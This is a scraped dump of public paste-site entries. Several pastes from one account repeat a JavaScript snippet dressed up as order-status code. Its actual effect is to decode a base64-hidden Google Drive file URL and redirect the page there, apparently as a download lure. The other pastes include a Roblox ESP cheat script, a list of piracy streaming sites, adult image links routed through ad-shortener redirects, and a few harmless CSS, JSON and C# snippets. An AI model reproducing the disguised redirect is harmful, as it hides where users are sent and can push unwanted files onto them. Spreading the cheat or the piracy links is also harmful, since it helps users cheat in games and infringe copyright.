id,title,username,language,date,content
cVDJ2u0i,Products.js,robloxhack212,JavaScript,Thursday 27th of March 2025 04:00:25 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/239/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
qTJS7KGL,Order.js,robloxhack212,JavaScript,Thursday 27th of March 2025 03:45:02 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/797/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
PnxQtHrb,[MufApp] Mapping Object Group,ffajarpratama,JSON,Thursday 27th of March 2025 03:30:09 AM CDT,"{
	""success"": true,
	""data"": {
		""list"": [
			{
				""obj_group_code"": ""001"",
				""obj_group_desc"": ""MOTOR"",
				""created_at"": 1742828404,
				""updataed_at"": 1742828404
			},
			{
				""obj_group_code"": ""002"",
				""obj_group_desc"": ""MOBIL"",
				""created_at"": 1743001206,
				""updataed_at"": 1743001206
			}
		],
		""paging"": {
			""count"": 2,
			""current_page"": 1,
			""limit"": 10,
			""total_page"": 1,
			""has_next"": false
		}
	},
	""message"": ""Success"",
	""errors"": null
}"
UYwshmgn,Products.js,robloxhack212,JavaScript,Thursday 27th of March 2025 02:58:54 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/045/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
M6gHwijq,Order.js,robloxhack212,JavaScript,Thursday 27th of March 2025 02:43:31 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/078/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
7FV641BK,Make Header Blur on Desktop Only,fauzanjeg,CSS,Thursday 27th of March 2025 02:35:15 AM CDT,"/** Make Header Blur on Desktop Only */
@media screen and (min-width: 1025px) {
    /** 1025px is the lowest value for dekstop on your site, 1024px is for tablet */
    .elementor-element.elementor-element-62117a69.sticky-pinned {
        backdrop-filter: blur(7px);
    }

    .elementor-element.elementor-element-62117a69 {
        backdrop-filter: blur(7px);
    }
}
"
Q8SpLRkr,Untitled,robloxhack212,JavaScript,Thursday 27th of March 2025 02:12:46 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/232/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
uDh2QfSZ,Products.js,robloxhack212,JavaScript,Thursday 27th of March 2025 01:57:16 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/889/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
pJ20Q2KH,ExamMixTaskNumbers,wingman007,C#,Thursday 27th of March 2025 01:56:50 AM CDT,"namespace RandNumbers
{
  internal class Program
  {
    static void Main(string[] args)
    {
      Random randGen = new Random();
      int[] array2Mix = new int[26];
      for (int i = 0; i < array2Mix.Length; i++)
      {
        array2Mix[i] = i;
      }
      int[] resultArray = new int[array2Mix.Length];
      int randNumber = 0;
      List<int> alreadyGenerated = new List<int>();
      for (int i = 0; i < array2Mix.Length; i++)
      {
        do
        {
          randNumber = randGen.Next(0, array2Mix.Length);
        } while ( alreadyGenerated.Contains(randNumber));
        alreadyGenerated.Add(randNumber);
        resultArray[i] = array2Mix[randNumber];
        Console.WriteLine(""{0,3:000}"", array2Mix[randNumber]);
      }

      // check if all numbers from 0 to 25 are there in the array
      bool isFound = false;
      int? foundAtPosition = null;
      for (int i = 0; i < array2Mix.Length; i++)
      {
        isFound = false;
        foundAtPosition = null;
        for (int j = 0; j < resultArray.Length; j++)
        {
          if (array2Mix[i] == resultArray[j])
          {
            isFound = true;
            foundAtPosition = j;
            break;
          }
        }
        if (foundAtPosition != null)
        {
          Console.WriteLine($""array2Mix[{i}] = {array2Mix[i]} found at position {foundAtPosition}"");
        }
        else 
        {
          Console.WriteLine($""array2Mix[{i}] = {array2Mix[i]} NOT FOUND"");
        }
      }
    }
  }
}
/*
Use with combination with Excel
The tasks in the second column. The generated numbers in the first column and sort them by first column. The tasks will be mixed
For faculty numbers in Excel use format 00#
*/"
hG0w0rPa,Order.js,robloxhack212,JavaScript,Thursday 27th of March 2025 01:41:53 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/765/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
fTva31EC,Lista Canali Veezie,killerangel73,HTML,Thursday 27th of March 2025 01:15:09 AM CDT,"https://streamingcommunity.lu 
https://dinostreaming.it 
https://cineblog01.now 
https://uicpiacenza.it 
https://www2.cb01.in 
https://altadefinizione.day 
https://altadefinizione01.living 
https://altadefinizioneapp.com 
https://altadefinizioneita.me 
https://ilgeniodellostreaming.rentals 
https://filmpertutti.be 
https://filmstreaming.page 
https://filmez.site 
https://piratestreaming.fyi 
https://casacinema.mom 
https://tantifilm.casa 
https://tantifilm.plus/film/ 
https://guardaserietv.mom 
https://guardaserietv.now 
https://eurostreaming.foundation 
https://www.animeunity.so 
https://toonitalia.xyz 
https://www.animeworld.so 
https://www.animesaturn.cx
"
nc3Vpzj9,Untitled,robloxhack212,JavaScript,Thursday 27th of March 2025 01:11:00 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/101/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
BZGpDG5i,Products.js,robloxhack212,JavaScript,Thursday 27th of March 2025 12:55:37 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/803/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
gtsPPCf8,"Mens only (March 27, 2025)",MarcSpencer,HTML,Thursday 27th of March 2025 12:55:17 AM CDT,"Aaron Aurora and Janusz Gol 
<a href=""https://fappic.com/a1ez3y7gunvt/783165.jpg""><img src=""https://img103.fappic.com/i/03910/a1ez3y7gunvt_t.jpg""></a><a href=""https://fappic.com/d1sc32pzwr3h/783166.jpg""><img src=""https://img103.fappic.com/i/03910/d1sc32pzwr3h_t.jpg""></a><a href=""https://fappic.com/7se91da86wop/783167.jpg""><img src=""https://img103.fappic.com/i/03910/7se91da86wop_t.jpg""></a><a href=""https://fappic.com/qlcmieqccd8f/783168.jpg""><img src=""https://img103.fappic.com/i/03910/qlcmieqccd8f_t.jpg""></a><a href=""https://fappic.com/8c1jx8369zzt/783169.jpg""><img src=""https://img103.fappic.com/i/03910/8c1jx8369zzt_t.jpg""></a><a href=""https://fappic.com/mvzd2ao2asp4/783170.jpg""><img src=""https://img103.fappic.com/i/03910/mvzd2ao2asp4_t.jpg""></a><a href=""https://fappic.com/6fnh8gp11dur/783171.jpg""><img src=""https://img103.fappic.com/i/03910/6fnh8gp11dur_t.jpg""></a><a href=""https://fappic.com/kzx4gxp29ks3/783172.jpg""><img src=""https://img103.fappic.com/i/03910/kzx4gxp29ks3_t.jpg""></a><a href=""https://fappic.com/gv9wtnx2cqno/783173.jpg""><img src=""https://img103.fappic.com/i/03910/gv9wtnx2cqno_t.jpg""></a><a href=""https://fappic.com/llyjfp4lpmig/783174.jpg""><img src=""https://img103.fappic.com/i/03910/llyjfp4lpmig_t.jpg""></a><a href=""https://fappic.com/wgdxkaqmyws6/783175.jpg""><img src=""https://img103.fappic.com/i/03910/wgdxkaqmyws6_t.jpg""></a><a href=""https://fappic.com/lcyx9gu074ir/783176.jpg""><img src=""https://img103.fappic.com/i/03910/lcyx9gu074ir_t.jpg""></a><a href=""https://fappic.com/2lzmdp4g8hhk/783177.jpg""><img src=""https://img103.fappic.com/i/03910/2lzmdp4g8hhk_t.jpg""></a><a href=""https://fappic.com/s6ewrn4n8cbl/783178.jpg""><img src=""https://img103.fappic.com/i/03910/s6ewrn4n8cbl_t.jpg""></a><a href=""https://fappic.com/wnyqtuzmkica/783179.jpg""><img src=""https://img103.fappic.com/i/03910/wnyqtuzmkica_t.jpg""></a><a href=""https://fappic.com/bzwg2u2i7hc6/783180.jpg""><img src=""https://img103.fappic.com/i/03910/bzwg2u2i7hc6_t.jpg""></a><a href=""https://fappic.com/s7yagrj9rc4x/783181.jpg""><img src=""https://img103.fappic.com/i/03910/s7yagrj9rc4x_t.jpg""></a><a href=""https://fappic.com/xfkrp3zaboa4/783182.jpg""><img src=""https://img103.fappic.com/i/03910/xfkrp3zaboa4_t.jpg""></a><a href=""https://fappic.com/9va9pp8x7ifx/783183.jpg""><img src=""https://img103.fappic.com/i/03910/9va9pp8x7ifx_t.jpg""></a><a href=""https://fappic.com/4jg782343u0o/783184.jpg""><img src=""https://img103.fappic.com/i/03910/4jg782343u0o_t.jpg""></a>

MrDeepVoice tops Alexandro Cabrera
<a href=""https://fappic.com/6k2dyjtchi59/men_-mrdeepvoice-tops-alexandro-cabrera-001.jpg""><img src=""https://img103.fappic.com/i/03910/6k2dyjtchi59_t.jpg""></a><a href=""https://fappic.com/2l5fepkq3g28/men_-mrdeepvoice-tops-alexandro-cabrera-002.jpg""><img src=""https://img103.fappic.com/i/03910/2l5fepkq3g28_t.jpg""></a><a href=""https://fappic.com/bbz55gkhzstc/men_-mrdeepvoice-tops-alexandro-cabrera-003.jpg""><img src=""https://img103.fappic.com/i/03910/bbz55gkhzstc_t.jpg""></a><a href=""https://fappic.com/4eibhi7id6yq/men_-mrdeepvoice-tops-alexandro-cabrera-004.jpg""><img src=""https://img103.fappic.com/i/03910/4eibhi7id6yq_t.jpg""></a><a href=""https://fappic.com/0r52tyfc250k/men_-mrdeepvoice-tops-alexandro-cabrera-005.jpg""><img src=""https://img103.fappic.com/i/03910/0r52tyfc250k_t.jpg""></a><a href=""https://fappic.com/0idxh72ajtps/men_-mrdeepvoice-tops-alexandro-cabrera-006.jpg""><img src=""https://img103.fappic.com/i/03910/0idxh72ajtps_t.jpg""></a><a href=""https://fappic.com/z1igfw25v672/men_-mrdeepvoice-tops-alexandro-cabrera-007.jpg""><img src=""https://img103.fappic.com/i/03910/z1igfw25v672_t.jpg""></a><a href=""https://fappic.com/ks8koyx306k9/men_-mrdeepvoice-tops-alexandro-cabrera-008.jpg""><img src=""https://img103.fappic.com/i/03910/ks8koyx306k9_t.jpg""></a><a href=""https://fappic.com/9md9w6cccu85/men_-mrdeepvoice-tops-alexandro-cabrera-009.jpg""><img src=""https://img103.fappic.com/i/03910/9md9w6cccu85_t.jpg""></a><a href=""https://fappic.com/43uvzhz87qxg/men_-mrdeepvoice-tops-alexandro-cabrera-010.jpg""><img src=""https://img103.fappic.com/i/03910/43uvzhz87qxg_t.jpg""></a><a href=""https://fappic.com/oxmfmp6958xu/men_-mrdeepvoice-tops-alexandro-cabrera-011.jpg""><img src=""https://img103.fappic.com/i/03910/oxmfmp6958xu_t.jpg""></a><a href=""https://fappic.com/dlz6xeboxp9a/men_-mrdeepvoice-tops-alexandro-cabrera-012.jpg""><img src=""https://img103.fappic.com/i/03910/dlz6xeboxp9a_t.jpg""></a><a href=""https://fappic.com/1kks3pa7s1gf/men_-mrdeepvoice-tops-alexandro-cabrera-013.jpg""><img src=""https://img103.fappic.com/i/03910/1kks3pa7s1gf_t.jpg""></a><a href=""https://fappic.com/lkju2w3nfybu/men_-mrdeepvoice-tops-alexandro-cabrera-014.jpg""><img src=""https://img103.fappic.com/i/03910/lkju2w3nfybu_t.jpg""></a><a href=""https://fappic.com/nl4eoum2lktq/men_-mrdeepvoice-tops-alexandro-cabrera-015.jpg""><img src=""https://img103.fappic.com/i/03910/nl4eoum2lktq_t.jpg""></a><a href=""https://fappic.com/pz56x3o2x3fn/men_-mrdeepvoice-tops-alexandro-cabrera-016.jpg""><img src=""https://img103.fappic.com/i/03910/pz56x3o2x3fn_t.jpg""></a>

Kosta Viking plays with Luciano
<a href=""https://u-e7sp8f75wx.urlcash.net""><img src=""https://img103.fappic.com/i/03910/ibpm9kef6318_t.jpg""></a><a href=""https://u-07sp8f87a4.urlcash.net""><img src=""https://img103.fappic.com/i/03910/sn2i4q0mo9zp_t.jpg""></a><a href=""https://u-77sp8f940u.urlcash.net""><img src=""https://img103.fappic.com/i/03910/0ady1gzivz1z_t.jpg""></a><a href=""https://u-v7sp8fjoys.urlcash.net""><img src=""https://img103.fappic.com/i/03910/e2zjkybv4pi6_t.jpg""></a><a href=""https://u-c7sp8fkhjn.urlcash.net""><img src=""https://img103.fappic.com/i/03910/ygnrdg0lakop_t.jpg""></a><a href=""https://u-a7sp8flxh2.urlcash.net""><img src=""https://img103.fappic.com/i/03910/e46a7h3wkj2r_t.jpg""></a><a href=""https://u-s7sp8fmgos.urlcash.net""><img src=""https://img103.fappic.com/i/03910/5ldjyr40yqsg_t.jpg""></a><a href=""https://u-c7sp8fnht5.urlcash.net""><img src=""https://img103.fappic.com/i/03910/1nx3pzo1vpi6_t.jpg""></a><a href=""https://u-q7sp8foqux.urlcash.net""><img src=""https://img103.fappic.com/i/03910/58s7l2j9sctx_t.jpg""></a><a href=""https://u-p7sp8fp1td.urlcash.net""><img src=""https://img103.fappic.com/i/03910/gs4t4jij5z7j_t.jpg""></a><a href=""https://u-47sp8fq2zs.urlcash.net""><img src=""https://img103.fappic.com/i/03910/a4hrgl4byfn2_t.jpg""></a><a href=""https://u-u7sp8frt3p.urlcash.net""><img src=""https://img103.fappic.com/i/03910/u5am70il2oxo_t.jpg""></a><a href=""https://u-o7sp8fshlx.urlcash.net""><img src=""https://img103.fappic.com/i/03910/vy80ltmw19b5_t.jpg""></a><a href=""https://u-p7sp8ftf55.urlcash.net""><img src=""https://img103.fappic.com/i/03910/0xoocesbqytf_t.jpg""></a><a href=""https://u-i7sp8fuyjb.urlcash.net""><img src=""https://img103.fappic.com/i/03910/h22riqbbfag4_t.jpg""></a><a href=""https://u-g7sp8fvkd5.urlcash.net""><img src=""https://img103.fappic.com/i/03910/nvxkqt9i556l_t.jpg""></a><a href=""https://u-c7sp8fw5xa.urlcash.net""><img src=""https://img103.fappic.com/i/03910/qqwb8dn8xhuc_t.jpg""></a><a href=""https://u-z7sp8fx5n3.urlcash.net""><img src=""https://img103.fappic.com/i/03910/bsf2lisy8wl6_t.jpg""></a><a href=""https://u-a7sp8gaky5.urlcash.net""><img src=""https://img103.fappic.com/i/03910/ny2w2tsvyfzl_t.jpg""></a><a href=""https://u-o7sp8gbo2h.urlcash.net""><img src=""https://img103.fappic.com/i/03910/rs4qywvxyprv_t.jpg""></a>

Noah Asli and Ethan Sinns
<a href=""https://u-k7sp8gd2qw.urlcash.net""><img src=""https://img103.fappic.com/i/03910/83ep9776812w_t.jpg""></a><a href=""https://u-v7sp8gel54.urlcash.net""><img src=""https://img103.fappic.com/i/03910/6xr8pzai9go4_t.jpg""></a><a href=""https://u-y7sp8gf5pl.urlcash.net""><img src=""https://img103.fappic.com/i/03910/i3b77d4p8prh_t.jpg""></a><a href=""https://u-i7sp8ggoay.urlcash.net""><img src=""https://img103.fappic.com/i/03910/zl3gvwgleyug_t.jpg""></a><a href=""https://u-b7sp8ghark.urlcash.net""><img src=""https://img103.fappic.com/i/03910/kzqxbltru4wd_t.jpg""></a><a href=""https://u-p7sp8giar4.urlcash.net""><img src=""https://img103.fappic.com/i/03910/w3zeqq01ow1y_t.jpg""></a><a href=""https://u-v7sp8g01mh.urlcash.net""><img src=""https://img103.fappic.com/i/03910/3s4sjk1owerg_t.jpg""></a><a href=""https://u-r7sp8g16ig.urlcash.net""><img src=""https://img103.fappic.com/i/03910/8z1p7y0w4ych_t.jpg""></a><a href=""https://u-d7sp8g27ni.urlcash.net""><img src=""https://img103.fappic.com/i/03910/n90ijybhawgl_t.jpg""></a><a href=""https://u-b7sp8g37jj.urlcash.net""><img src=""https://img103.fappic.com/i/03910/wblim9nbgd08_t.jpg""></a><a href=""https://u-x7sp8g4lmt.urlcash.net""><img src=""https://img103.fappic.com/i/03910/sd88locnal02_t.jpg""></a><a href=""https://u-d7sp8g52jy.urlcash.net""><img src=""https://img103.fappic.com/i/03910/6fqokcyiux2q_t.jpg""></a><a href=""https://u-g7sp8g6vug.urlcash.net""><img src=""https://img103.fappic.com/i/03910/jvf9r89wwvh7_t.jpg""></a><a href=""https://u-17sp8g7556.urlcash.net""><img src=""https://img103.fappic.com/i/03910/zm0iuloeor4q_t.jpg""></a><a href=""https://u-x7sp8g8wb0.urlcash.net""><img src=""https://img103.fappic.com/i/03910/ddjr2rxwgu0s_t.jpg""></a>

"
vWKzEub6,FPE - Da Fangame ESP All NPCs,Jame_nest123,Lua,Thursday 27th of March 2025 12:51:04 AM CDT,"--- It's fine if you don't give me credits lmao🔥

local Good = Color3.new(0, 255, 0)
local Neutral = Color3.new(255, 255, 0)
local Enemy = Color3.new(255, 0, 0)
local UnIdentified = Color3.new(255, 255, 255)

local highlight = Instance.new(""Highlight"")
local highlight2 = Instance.new(""Highlight"")
local highlight3 = Instance.new(""Highlight"")

local Circle = workspace.School.NPCs:FindFirstChild(""Miss Circle"")
local Bloomie = workspace.School.NPCs:FindFirstChild(""Miss Bloomie"")
local Thavel = workspace.School.NPCs:FindFirstChild(""Miss Thavel"")

if Circle and Bloomie and Thavel then
    highlight.Parent = Circle
    highlight2.Parent = Bloomie
    highlight3.Parent = Thavel
end

highlight.FillTransparency = 1
highlight2.FillTransparency = 1
highlight3.FillTransparency = 1

highlight.OutlineColor = Enemy
highlight2.OutlineColor = Enemy
highlight3.OutlineColor = Enemy

local Compass = workspace.School.NPCs:FindFirstChild(""Mister Compass"")
local Fer = workspace.School.NPCs:FindFirstChild(""Mister Ferrum"")
local Pin = workspace.School.NPCs:FindFirstChild(""Mister Pin"")
local Grace = workspace.School.NPCs:FindFirstChild(""Miss Grace"")

if Compass and Fer and Pin then
    local highlight4 = Instance.new(""Highlight"")
    local highlight5 = Instance.new(""Highlight"")
    local highlight6 = Instance.new(""Highlight"")

    highlight4.OutlineColor = Enemy
    highlight5.OutlineColor = Enemy
    highlight6.OutlineColor = Enemy

    highlight4.FillTransparency = 1
    highlight5.FillTransparency = 1
    highlight6.FillTransparency = 1

    highlight4.Parent = workspace.School.NPCs[""Mister Compass""]
    highlight5.Parent = workspace.School.NPCs[""Mister Ferrum""]
    highlight6.Parent = workspace.School.NPCs[""Mister Pin""]
end

local PHighlight = Instance.new(""Highlight"")

PHighlight.FillTransparency = 1
PHighlight.OutlineColor = Neutral
PHighlight.Parent = workspace.School.NPCs[""Miss Grace""]

local Chip = workspace.School.NPCs:FindFirstChild(""Chip"")

if Chip then
    local highlightChip = Instance.new(""Highlight"")
    highlightChip.OutlineColor = Good
    highlightChip.FillTransparency = 1
    highlightChip.Parent = Chip
end

print(""FPE - Da Fangame ESP NPCs Activated (give Credits to James_nest123 on Roblox)"")
"
